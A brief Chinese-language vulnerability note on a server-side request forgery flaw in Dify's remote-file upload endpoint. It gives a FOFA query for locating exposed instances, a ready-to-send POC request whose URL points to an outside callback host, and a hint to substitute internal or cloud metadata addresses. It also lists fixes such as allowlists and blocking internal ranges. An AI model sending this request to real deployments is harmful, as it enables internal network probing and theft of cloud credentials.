## Dify upload SSRF 漏洞

## 漏洞描述
Dify 控制台接口 `/console/api/remote-files/upload` 允许用户提供任意 URL，后端会以服务端身份下载文件，未对目标地址做限制，导致攻击者可触发 SSRF 探测内网或访问云元数据服务。

## 资产测绘
```
fofa: app="Dify"
```

## POC
```
POST /console/api/remote-files/upload HTTP/1.1
Host: <target>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip

{"url":"http://pszyxvojwn.iyhc.eu.org"}
```
根据目标响应内容可判断请求是否由服务器发起，可进一步替换为内网或元数据地址。

## 修复建议
- 对目标 URL 做协议与域名白名单
- 禁止访问内网 CIDR、云元数据地址
- 为下载任务设置连接/读取超时时间

